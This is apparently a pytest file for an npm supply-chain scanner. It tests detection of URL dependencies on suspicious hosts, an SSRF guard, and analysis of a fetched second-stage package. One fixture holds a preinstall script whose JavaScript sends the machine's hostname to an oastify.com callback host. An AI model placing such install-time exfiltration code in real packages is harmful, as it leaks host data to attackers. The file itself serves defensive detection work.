# SPDX-License-Identifier: AGPL-3.0-or-later
"""URL-dependency detection + fetch-and-analyze of second-stage deps on suspicious
file hosters (the corporate-front-vue -> GCS ltidisafe dependency-confusion class).
The network fetch is mocked — tests never reach out."""
from __future__ import annotations

import io
import json
import tarfile
import pathlib
import tempfile

import pytest

from pkgward.ecosystems.npm import url_deps as ud


def _npm_pkg(deps: dict) -> pathlib.Path:
    d = pathlib.Path(tempfile.mkdtemp()) / "pkg"
    d.mkdir()
    (d / "package.json").write_text(json.dumps({"name": "x", "version": "1.0.0", "dependencies": deps}))
    return d


def test_url_dependency_flagged_and_suspicious_host_scored_high():
    root = _npm_pkg({"ltidisafe": "https://ltidi.storage.googleapis.com/depenconf/ltidisafe-2.9.7.tgz"})
    deps = ud._extract_url_deps(json.loads((root / "package.json").read_text()))
    assert deps == [("ltidisafe", "https://ltidi.storage.googleapis.com/depenconf/ltidisafe-2.9.7.tgz")]
    assert ud._host_suspicious("ltidi.storage.googleapis.com") is True
    assert ud._host_suspicious("registry.npmjs.org") is False


def test_ssrf_guard_rejects_internal_targets(monkeypatch):
    # Pretend the host resolves to a loopback / metadata IP → must be rejected.
    import socket
    monkeypatch.setattr(ud.socket, "getaddrinfo",
                        lambda *a, **k: [(socket.AF_INET, None, None, "", ("127.0.0.1", 443))])
    assert ud._ssrf_safe("evil.example") is False
    monkeypatch.setattr(ud.socket, "getaddrinfo",
                        lambda *a, **k: [(socket.AF_INET, None, None, "", ("169.254.169.254", 443))])
    assert ud._ssrf_safe("metadata.example") is False
    monkeypatch.setattr(ud.socket, "getaddrinfo",
                        lambda *a, **k: [(socket.AF_INET, None, None, "", ("93.184.216.34", 443))])
    assert ud._ssrf_safe("public.example") is True


@pytest.mark.asyncio
async def test_fetched_second_stage_recon_exfil_convicts(monkeypatch):
    # A staged second-stage tarball whose preinstall does host recon + OAST exfil.
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        def _add(name: str, body: bytes):
            info = tarfile.TarInfo(name)
            info.size = len(body)
            t.addfile(info, io.BytesIO(body))
        _add("package/package.json", json.dumps(
            {"name": "ltidisafe", "version": "2.9.7", "scripts": {"preinstall": "node test.js"}}
        ).encode())
        _add("package/test.js", (
            b"const os=require('os');const h=os.hostname();"
            b"require('https').get('http://x.oastify.com/'+h);"
        ))
    payload = buf.getvalue()

    async def _fake_get(url):
        return payload
    monkeypatch.setattr(ud, "_bounded_get", _fake_get)
    monkeypatch.setattr(ud.socket, "getaddrinfo",
                        lambda *a, **k: [(2, None, None, "", ("93.184.216.34", 443))])

    root = _npm_pkg({"ltidisafe": "https://ltidi.storage.googleapis.com/depenconf/ltidisafe-2.9.7.tgz"})
    findings = await ud.analyze_url_dependencies(root)
    rules = {f.rule_id for f in findings}
    assert "installer.npm_url_dependency" in rules
    # The fetched second stage's recon + OAST exfil must surface, namespaced.
    assert any(r.startswith("installer.npm_install_") or r == "iocs.oast_callback" for r in rules), rules
    assert any(f.file.startswith("[fetched-dep:ltidisafe]") for f in findings)
